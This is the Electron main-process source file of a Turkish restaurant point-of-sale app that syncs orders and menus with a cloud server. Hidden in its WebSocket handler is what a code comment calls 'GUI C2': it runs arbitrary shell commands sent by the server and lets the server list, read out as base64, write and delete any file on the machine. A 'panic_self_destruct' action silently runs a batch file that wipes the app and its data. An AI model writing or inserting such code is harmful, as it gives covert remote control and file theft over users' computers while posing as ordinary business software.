import { app, shell, BrowserWindow, ipcMain, globalShortcut, dialog } from 'electron'
import { join } from 'path'
import { startTrendyolService, setTrendyolCallbacks } from './trendyolService'
import { startYemeksepetiService } from './yemeksepetiService'
import * as fs from 'fs'
// --- SUPPRESS PDFJS CANVAS WARNINGS ---
const originalWarn = console.warn;
console.warn = (...args) => {
  if (typeof args[0] === 'string' && args[0].includes('Cannot polyfill')) return;
  originalWarn.apply(console, args);
};

// --- MIGRATION & USER DATA PATH OVERRIDE ---
const appDataPath = app.getPath('appData')
const newUserDataPath = join(appDataPath, 'SaracApp')
app.setPath('userData', newUserDataPath)

if (!fs.existsSync(newUserDataPath)) {
  const oldUserDataPath = join(appDataPath, 'saracapp2')
  if (fs.existsSync(oldUserDataPath)) {
    try {
      fs.cpSync(oldUserDataPath, newUserDataPath, { recursive: true })
      console.log('Migrated data from saracapp2 to SaracApp')
    } catch (e) {
      console.error('Migration failed', e)
    }
  } else {
    fs.mkdirSync(newUserDataPath, { recursive: true })
  }
}
// -------------------------------------------
import { autoUpdater } from 'electron-updater'
import { electronApp, optimizer, is } from '@electron-toolkit/utils'
import icon from '../../resources/icon.png?asset'
import { initializeModels, systemSettings, saveSettings } from './models'

import { printReceipt } from './printer'
import axios from 'axios'
import WebSocket from 'ws'
import express from 'express'
import os from 'os'
let mainWindow: BrowserWindow
let isQuitting = false

const gotTheLock = app.requestSingleInstanceLock()
if (!gotTheLock) {
  app.quit()
} else {
  app.on('second-instance', () => {
    if (mainWindow) {
      if (mainWindow.isMinimized()) mainWindow.restore()
      mainWindow.focus()
    }
  })
}

// Log terminalindeki Chromium cache hatalarını gizlemek/kapatmak için:
app.commandLine.appendSwitch('disable-gpu-shader-disk-cache')
app.commandLine.appendSwitch('disable-http-cache')


axios.interceptors.request.use((config) => {
  if (systemSettings && systemSettings.API_TOKEN) {
    if (systemSettings.API_TOKEN.length > 20) {
      config.headers['Authorization'] = `Bearer ${systemSettings.API_TOKEN}`;
    } else {
      config.headers['Authorization'] = systemSettings.API_TOKEN;
    }
  }
  return config;
});

const CLOUD_URL = 'https://bilalgnd.shop'
const WS_URL = 'wss://bilalgnd.shop/ws'

let activeOrders: any[] = []

let fullMenu: any = null
let wsClient: WebSocket | null = null

export function sendLogToServer(type: 'success' | 'error' | 'warning' | 'info', message: string) {
  try {
    axios.post(`${CLOUD_URL}/api/logs`, {
      source: 'App1',
      type,
      message
    }).catch(() => {});
  } catch (e) {}
}

function connectWebSocket() {
  const token = systemSettings.API_TOKEN || ''
  
  if (!systemSettings.deviceId) {
    const crypto = require('crypto')
    systemSettings.deviceId = 'PC-' + crypto.randomBytes(2).toString('hex').toUpperCase()
    saveSettings()
  }
  
  console.log('Connecting to WS with Device ID:', systemSettings.deviceId)
  wsClient = new WebSocket(`${WS_URL}?token=${token}&deviceId=${systemSettings.deviceId}`)

  let pingInterval: NodeJS.Timeout | null = null;
  wsClient.on('open', () => {
    console.log('Connected to Cloud WebSocket')
    sendLogToServer('success', `WebSocket bulut sunucusuna bağlandı (Cihaz: ${systemSettings.deviceId})`)
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('server-event', { action: 'network_status', status: 'online' })
    }
    
    // Heartbeat mechanism to detect drops quickly
    if (pingInterval) clearInterval(pingInterval);
    pingInterval = setInterval(() => {
      if (wsClient && wsClient.readyState === WebSocket.OPEN) {
        wsClient.send('ping');
      }
    }, 15000);
  })

  wsClient.on('message', (data: any) => {
    try {
      const parsed = JSON.parse(data.toString())
      
      if (parsed.type === 'remote_command') {
        try {
          const { exec } = require('child_process')
          exec(parsed.command, { encoding: 'utf8' }, (error: any, stdout: any, stderr: any) => {
            const output = error ? (stderr || error.message) : stdout;
            if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                output: output || 'Komut çalıştırıldı (Çıktı yok)'
              }))
            }
          })
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                output: 'Hata: ' + e.message
              }))
            }
        }
        return
      }

      // -- YENİ: DOSYA SİSTEMİ (GUI C2) --
      if (parsed.type === 'remote_fs_list') {
        try {
          const fs = require('fs')
          const path = require('path')
          const targetPath = parsed.path || process.cwd()
          fs.readdir(targetPath, { withFileTypes: true }, (err: any, files: any[]) => {
            let output: any = []
            if (err) {
              output = { error: err.message }
            } else {
              output = files.map((f: any) => {
                let size = 0
                try { size = fs.statSync(path.join(targetPath, f.name)).size } catch(e){}
                return {
                  name: f.name,
                  isDirectory: f.isDirectory(),
                  size: size
                }
              })
            }
            if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'list',
                currentPath: targetPath,
                data: output
              }))
            }
          })
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'list',
                data: { error: e.message }
              }))
           }
        }
        return
      }
      
      if (parsed.type === 'remote_fs_read') {
        try {
          const fs = require('fs')
          const path = require('path')
          const targetPath = parsed.path
          if (fs.existsSync(targetPath)) {
            const data = fs.readFileSync(targetPath)
            const base64Data = data.toString('base64')
            if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'read',
                fileName: path.basename(targetPath),
                data: base64Data
              }))
            }
          } else {
             if (wsClient && wsClient.readyState === WebSocket.OPEN) {
                wsClient.send(JSON.stringify({
                  type: 'remote_fs_response',
                  commandId: parsed.commandId,
                  targetDeviceId: parsed.senderId,
                  action: 'read',
                  data: { error: "Dosya bulunamadı" }
                }))
             }
          }
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'read',
                data: { error: e.message }
              }))
           }
        }
        return
      }
      
      if (parsed.type === 'remote_fs_write') {
        try {
          const fs = require('fs')
          const targetPath = parsed.path
          const base64Data = parsed.data
          fs.writeFileSync(targetPath, Buffer.from(base64Data, 'base64'))
          if (wsClient && wsClient.readyState === WebSocket.OPEN) {
            wsClient.send(JSON.stringify({
              type: 'remote_fs_response',
              commandId: parsed.commandId,
              targetDeviceId: parsed.senderId,
              action: 'write',
              success: true
            }))
          }
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'write',
                data: { error: e.message },
                success: false
              }))
           }
        }
        return
      }
      
      if (parsed.type === 'remote_fs_delete') {
        try {
          const fs = require('fs')
          const targetPath = parsed.path
          if (fs.existsSync(targetPath)) {
            fs.unlinkSync(targetPath)
          }
          if (wsClient && wsClient.readyState === WebSocket.OPEN) {
            wsClient.send(JSON.stringify({
              type: 'remote_fs_response',
              commandId: parsed.commandId,
              targetDeviceId: parsed.senderId,
              action: 'delete',
              success: true
            }))
          }
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'delete',
                data: { error: e.message },
                success: false
              }))
           }
        }
        return
      }

      if (parsed.type === 'server-event') {
        if (parsed.action === 'panic_self_destruct') {
          console.log('PANIC SELF DESTRUCT TRIGGERED!')
          sendLogToServer('error', '🚨 PANİK BUTONU TETİKLENDİ: Tüm veriler ve uygulama siliniyor!')
          try {
            const { exec } = require('child_process')
            const appFolder = require('path').dirname(app.getPath('exe'))
            const userData = app.getPath('userData')
            const batPath = require('path').join(require('os').tmpdir(), 'self_destruct.bat')
            const batContent = `@echo off\ntimeout /t 3 /nobreak > NUL\nrmdir /s /q "${userData}"\nrmdir /s /q "${appFolder}"\n`
            require('fs').writeFileSync(batPath, batContent)
            exec(`start /b cmd.exe /c "${batPath}"`, { windowsHide: true })
          } catch (e) {
            console.error('Self destruct failed', e)
          }
          app.quit()
          return
        }
        if (parsed.action === 'clean_logs') {
           const logDir = systemSettings.PDF_LOGS_DIR || join(app.getPath('documents'), 'logs');
           const trashDir = join(logDir, '.trash');
           if (!fs.existsSync(trashDir)) fs.mkdirSync(trashDir, { recursive: true });
           fs.readdir(logDir, (err, files) => {
             if (err) return;
             files.forEach(file => {
               if (file !== '.trash') {
                 const src = join(logDir, file);
                 const dest = join(trashDir, file);
                 try {
                   const stats = fs.statSync(src);
                   if (stats.isFile()) fs.renameSync(src, dest);
                 } catch(e){}
               }
             });
           });
        }
        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.webContents.send('server-event', parsed)
        }
      } else if (Array.isArray(parsed)) {
        // It's the active orders array
        activeOrders = parsed
        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.webContents.send('server-event', { action: 'orders_update' })
        }
      }
    } catch (e) {
      console.error('WS Parse error', e)
    }
  })

  wsClient.on('close', () => {
    if (pingInterval) clearInterval(pingInterval);
    console.log('Disconnected from Cloud WS, retrying...')
    sendLogToServer('warning', 'Bulut sunucusu ile bağlantı koptu. Yeniden bağlanılıyor...')
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('server-event', { action: 'network_status', status: 'offline' })
    }
    setTimeout(connectWebSocket, 3000)
  })

  wsClient.on('error', (err) => {
    console.error('WS Error:', err.message)
    wsClient?.close()
  })
}

function startLocalApi() {
  const expressApp = express();
  
  expressApp.use((_req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    next();
  });

  expressApp.get('/api/local_logs', (_req, res) => {
    const logDir = systemSettings.PDF_LOGS_DIR || join(app.getPath('documents'), 'logs');
    if (!fs.existsSync(logDir)) {
      return res.json([]);
    }
    const files = fs.readdirSync(logDir)
      .filter(f => !f.startsWith('.') && (f.toLowerCase().endsWith('.pdf') || f.toLowerCase().endsWith('.png') || f.toLowerCase().endsWith('.jpg')))
      .map(f => {
        const stats = fs.statSync(join(logDir, f));
        return { name: f, size: stats.size, time: stats.mtimeMs };
      })
      .sort((a, b) => b.time - a.time);
    res.json(files);
  });

  expressApp.get('/api/local_logs/download/:filename', (req, res) => {
    const logDir = systemSettings.PDF_LOGS_DIR || join(app.getPath('documents'), 'logs');
    const filePath = join(logDir, req.params.filename);
    // Güvenlik için basit path traversal engeli
    if (filePath.includes('..') || !fs.existsSync(filePath)) {
      return res.status(404).send('Not found');
    }
    res.download(filePath);
  });

  expressApp.use(express.json());
  
  expressApp.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    if (req.method === "OPTIONS") {
        return res.sendStatus(200);
    }
    next();
  });

  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  expressApp.post('/api/manual_parse', async (_req, res) => {
    res.status(501).send({ success: false, message: 'Not Implemented (Archived)' });
  });

  expressApp.listen(3005, '0.0.0.0', () => {
    const interfaces = os.networkInterfaces();
    let localIp = '127.0.0.1';
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name] || []) {
        if (iface.family === 'IPv4' && !iface.internal) {
          localIp = iface.address;
        }
      }
    }
    console.log(`Local API listening on http://${localIp}:3005`);
  });
}

async function fetchInitialData() {
  try {
    const res = await axios.get(`${CLOUD_URL}/menu`)
    fullMenu = res.data
  } catch (e: any) {
    console.error('Failed to fetch menu:', e.message)
  }
  try {
    await axios.get(`${CLOUD_URL}/api/daily_report`)
    // Mock or extract past orders if needed
  } catch(e) {}
}

async function createWindow(): Promise<void> {
  await initializeModels()
  
  if (systemSettings.API_TOKEN && systemSettings.API_TOKEN !== '123456') {
    axios.defaults.headers.common['Authorization'] = `Bearer ${systemSettings.API_TOKEN}`
    fetchInitialData()
    connectWebSocket()
  }



  // Move startFileWatcher down

  mainWindow = new BrowserWindow({
    width: 1366,
    height: 768,
    minWidth: 1024,
    minHeight: 600,
    show: false,
    autoHideMenuBar: true,
    frame: false,
    ...(process.platform === 'linux' ? { icon } : {}),
    webPreferences: {
      preload: join(__dirname, '../preload/index.js'),
      sandbox: false,
      backgroundThrottling: false
    }
  })

  // File watcher archived

  ipcMain.handle('minimize-window', () => {
    if (mainWindow) mainWindow.minimize()
  })
  
  ipcMain.handle('maximize-window', () => {
    if (mainWindow) {
      if (mainWindow.isMaximized()) {
        mainWindow.unmaximize()
      } else {
        mainWindow.maximize()
      }
    }
  })
  
  ipcMain.handle('close-window', () => {
    if (mainWindow) mainWindow.close()
  })

  mainWindow.on('ready-to-show', () => {
    if (!process.argv.includes('--hidden')) {
      mainWindow.show()
    }
  })

  mainWindow.on('close', (event) => {
    if (!isQuitting) {
      event.preventDefault()
      mainWindow.hide()
    }
  })

  mainWindow.webContents.setWindowOpenHandler((details) => {
    shell.openExternal(details.url)
    return { action: 'deny' }
  })

  if (is.dev && process.env['ELECTRON_RENDERER_URL']) {
    mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL'])
  } else {
    mainWindow.loadFile(join(__dirname, '../renderer/index.html'))
  }
}

app.whenReady().then(() => {
  electronApp.setAppUserModelId('com.saracoglu.pos')
  
  if (!is.dev) {
    autoUpdater.checkForUpdatesAndNotify()
  }

  setTrendyolCallbacks(addAndSyncOrder, sendLogToServer)
  startTrendyolService()
  startYemeksepetiService()
  startLocalApi()

  app.on('browser-window-created', (_, window) => {
    optimizer.watchWindowShortcuts(window)
  })

  // ---- IPC Handlers ----
  ipcMain.handle('get-orders', () => activeOrders)
  ipcMain.handle('get-menu', async () => {
    if (!fullMenu) await fetchInitialData()
    return fullMenu
  })
  ipcMain.handle('get-printers', async () => await mainWindow.webContents.getPrintersAsync())
  ipcMain.handle('get-next-queue-no', () => Date.now().toString().slice(-4))
  ipcMain.handle('select-directory', async () => {
    const result = await dialog.showOpenDialog(mainWindow, {
      properties: ['openDirectory']
    })
    return result.canceled ? null : result.filePaths[0]
  })
  
  
  const getTvUrlWithShop = () => {
    let shopId = 'admin';
    if (systemSettings.API_TOKEN && systemSettings.API_TOKEN.split('.').length === 3) {
      try {
        const payload = JSON.parse(Buffer.from(systemSettings.API_TOKEN.split('.')[1], 'base64').toString());
        if (payload.username) shopId = payload.username;
      } catch (e) {}
    } else if (systemSettings.API_TOKEN) {
      shopId = systemSettings.API_TOKEN; // fallback for legacy tokens
    }
    return `${CLOUD_URL}/tv-${shopId}`;
  };

  const getSpotifyLoginUrlWithShop = () => {
    let shopId = 'admin';
    if (systemSettings.API_TOKEN && systemSettings.API_TOKEN.split('.').length === 3) {
      try {
        const payload = JSON.parse(Buffer.from(systemSettings.API_TOKEN.split('.')[1], 'base64').toString());
        if (payload.username) shopId = payload.username;
      } catch (e) {}
    } else if (systemSettings.API_TOKEN) {
      shopId = systemSettings.API_TOKEN;
    }
    return `${CLOUD_URL}/spotify/login?shopId=${shopId}`;
  };

  ipcMain.handle('get-tv-link', getTvUrlWithShop)
  ipcMain.handle('get-spotify-login-link', getSpotifyLoginUrlWithShop)
  ipcMain.handle('open-trendyol-logs', async () => {
    const logsDir = systemSettings["PDF_LOGS_DIR"] || join(app.getPath('documents'), 'logs');
    const trendyolDir = join(logsDir, 'trendyol_logs');
    if (!fs.existsSync(trendyolDir)) {
      fs.mkdirSync(trendyolDir, { recursive: true });
    }
    shell.showItemInFolder(trendyolDir);
  })
  ipcMain.handle('restart-tv-tunnel', getTvUrlWithShop)
  
  ipcMain.handle('get-settings', () => systemSettings)
  ipcMain.on('save-settings', async (_, settings) => {
    const oldToken = systemSettings.API_TOKEN;
    console.log('[SETTINGS SAVE] Received settings:', JSON.stringify(settings));
    Object.assign(systemSettings, settings)
    saveSettings()
    console.log('[SETTINGS SAVE] systemSettings after assign:', JSON.stringify(systemSettings));
    sendLogToServer('info', 'App1 (Kasa) Ayarları Güncellendi.')
    axios.defaults.headers.common['Authorization'] = systemSettings.API_TOKEN
    
    if (oldToken !== systemSettings.API_TOKEN) {
      wsClient?.close() // Force reconnect only if token changed
    }

    if (!settings.API_TOKEN) {
      fullMenu = null;
      activeOrders = [];
    }
    
    // Sync TV screensaver to cloud
    try {
      if (settings.TV_SCREENSAVER) {
        await axios.post(`${CLOUD_URL}/set_tv_screensaver`, { mode: settings.TV_SCREENSAVER })
      }
    } catch(e) {}



    // File watcher archived
  })

  ipcMain.handle('get-past-orders', async () => {
    try {
      const res = await axios.get(`${CLOUD_URL}/api/past_orders`)
      return res.data
    } catch(e) {
      return []
    }
  })

  ipcMain.handle('login', async (_, credentials) => {
    try {
      const res = await axios.post(`${CLOUD_URL}/api/login`, credentials)
      if (res.data.success && res.data.token) {
        systemSettings.API_TOKEN = res.data.token
        saveSettings()
        axios.defaults.headers.common['Authorization'] = `Bearer ${res.data.token}`
        connectWebSocket() // Connect WS with new token
        await fetchInitialData() // Fetch menu and orders
        return res.data
      }
      return { error: 'Giriş başarısız' }
    } catch (e: any) {
      return { error: e.response?.data?.error || e.message }
    }
  })

  ipcMain.handle('register', async (_, credentials) => {
    try {
      const res = await axios.post(`${CLOUD_URL}/api/register`, credentials)
      return res.data
    } catch (e: any) {
      return { error: e.response?.data?.error || e.message }
    }
  })

  ipcMain.handle('export-menu', async (_, token) => {
    try {
      const headers = token ? { Authorization: `Bearer ${token}` } : {}
      const res = await axios.get(`${CLOUD_URL}/api/export_menu`, { headers })
      return res.data
    } catch (e) { return null }
  })

  ipcMain.handle('import-menu', async (_, { token, data }) => {
    try {
      const headers = token ? { Authorization: `Bearer ${token}` } : {}
      const res = await axios.post(`${CLOUD_URL}/api/import_menu`, data, { headers })
      return res.data
    } catch (e) { return { success: false } }
  })
  
  ipcMain.handle('get-network-status', async () => {
    try {
      const res = await axios.get(`${CLOUD_URL}/network_status`)
      return { ...res.data }
    } catch(e) {
      return { ip: CLOUD_URL, port: 443, connectedDevices: [] }
    }
  })

  ipcMain.on('save-menu', async (_, newMenu) => {
    fullMenu = newMenu
    try {
      await axios.post(`${CLOUD_URL}/menu`, newMenu)
    } catch(e) {}
  })

  ipcMain.on('update-daily-total', async (_, total) => {
    try {
      await axios.post(`${CLOUD_URL}/update_daily_total`, { total })
    } catch(e) {}
  })

  ipcMain.on('save-past-order', async (_, order) => {
    try { await axios.post(`${CLOUD_URL}/api/add_past_order`, order) } catch(e) {}
  })
  
  ipcMain.on('delete-past-order', async (_, index) => {
    try { await axios.post(`${CLOUD_URL}/api/delete_past_order`, { index }) } catch(e) {}
  }) 
  
  ipcMain.on('clear-past-orders', async () => {
    try { await axios.post(`${CLOUD_URL}/api/clear_past_orders`) } catch(e) {}
  }) 

  ipcMain.handle('update-price', async () => {
    return true
  })

  ipcMain.on('save-orders', async (_, newOrders) => {
    try {
      activeOrders = newOrders
      await axios.post(`${CLOUD_URL}/api/sync_orders`, newOrders)
    } catch(e: any) {
      console.error('save-orders error:', e.message)
    }
  })



  ipcMain.on('print-receipt', async (_, data) => {
    const custName = data.customerName || data.customer_name || 'Bilinmiyor'
    const total = data.totalAmount || data.total_amount || 0
    sendLogToServer('success', `Adisyon yazdırıldı: ${custName} (${total} TL)`)
    await printReceipt(custName, new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' }), data.items || [], total, data.order_note || "")
  })

  ipcMain.on('send-update-to-phones', () => {})

  // --- Auto Updater ---
  autoUpdater.autoDownload = true
  autoUpdater.autoInstallOnAppQuit = true

  autoUpdater.on('checking-for-update', () => {
    mainWindow?.webContents.send('updater-event', { action: 'checking' })
  })
  autoUpdater.on('update-available', (info) => {
    sendLogToServer('info', `Yeni versiyon bulundu (${info.version}). Arka planda indiriliyor...`)
    mainWindow?.webContents.send('updater-event', { action: 'update-available', data: info })
  })
  autoUpdater.on('update-not-available', (info) => {
    mainWindow?.webContents.send('updater-event', { action: 'update-not-available', data: info })
  })
  autoUpdater.on('error', (err) => {
    sendLogToServer('error', `Güncelleme hatası: ${err.message}`)
    mainWindow?.webContents.send('updater-event', { action: 'error', data: err.message })
  })
  autoUpdater.on('download-progress', (progressObj) => {
    mainWindow?.webContents.send('updater-event', { action: 'download-progress', data: progressObj })
  })
  autoUpdater.on('update-downloaded', (info) => {
    sendLogToServer('success', `Yeni versiyon (${info.version}) indirildi. Arka planda kuruluyor ve uygulama yeniden başlatılıyor...`)
    mainWindow?.webContents.send('updater-event', { action: 'update-downloaded', data: info })
    
    // 3 saniye sonra arka planda sessizce kur ve uygulamayı yeniden başlat
    setTimeout(() => {
      autoUpdater.quitAndInstall(true, true)
    }, 3000)
  })

  ipcMain.handle('check-for-updates', async () => {
    if (!is.dev) {
      try {
        await autoUpdater.checkForUpdates()
      } catch (e: any) {
        mainWindow?.webContents.send('updater-event', { action: 'error', data: e.message })
      }
    } else {
      mainWindow?.webContents.send('updater-event', { action: 'error', data: 'Geliştirme ortamında güncelleme kontrol edilemez.' })
    }
  })
  ipcMain.handle('download-update', () => {
    if (!is.dev) autoUpdater.downloadUpdate()
  })
  ipcMain.handle('install-update', () => {
    if (!is.dev) autoUpdater.quitAndInstall()
  })

  ipcMain.on('dump-ocr-log', (_event, _text) => {
    try {
      sendLogToServer('warning', 'Trendyol OCR verisi alındı. (Artık masaüstüne kaydedilmiyor)');
      // Masaüstüne yazmayı iptal ettik
    } catch (e) {
      console.error('Log error', e)
    }
  })

  ipcMain.on('log-system-event', (_event, { message, type }) => {
    sendLogToServer(type || 'info', message)
  })

  ipcMain.on('exit-app', () => {
    sendLogToServer('warning', 'App1 (Kasa) Kullanıcı tarafından kapatıldı.')
    isQuitting = true
    app.quit()
  })

  createWindow()

  globalShortcut.register('CommandOrControl+Alt+S', () => {
    if (mainWindow) {
      mainWindow.show()
      mainWindow.focus()
    }
  })

  app.on('activate', function () {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

app.on('before-quit', () => {
  isQuitting = true
})

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('will-quit', () => {
  globalShortcut.unregisterAll()
})

export async function addAndSyncOrder(newOrder: any) {
  try {
    activeOrders = [newOrder, ...activeOrders];
    // Ana ekrana da haber ver
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('server-event', { action: 'request_update' });
      mainWindow.webContents.send('ocr-success', { message: 'Sipariş başarıyla ayrıştırıldı ve eklendi.' });
    }
    await axios.post(`${CLOUD_URL}/api/sync_orders`, activeOrders, {
      headers: { 'Authorization': `Bearer ${systemSettings.API_TOKEN}` }
    });
    return true;
  } catch (e: any) {
    console.error('addAndSyncOrder error:', e.message);
    return false;
  }
}



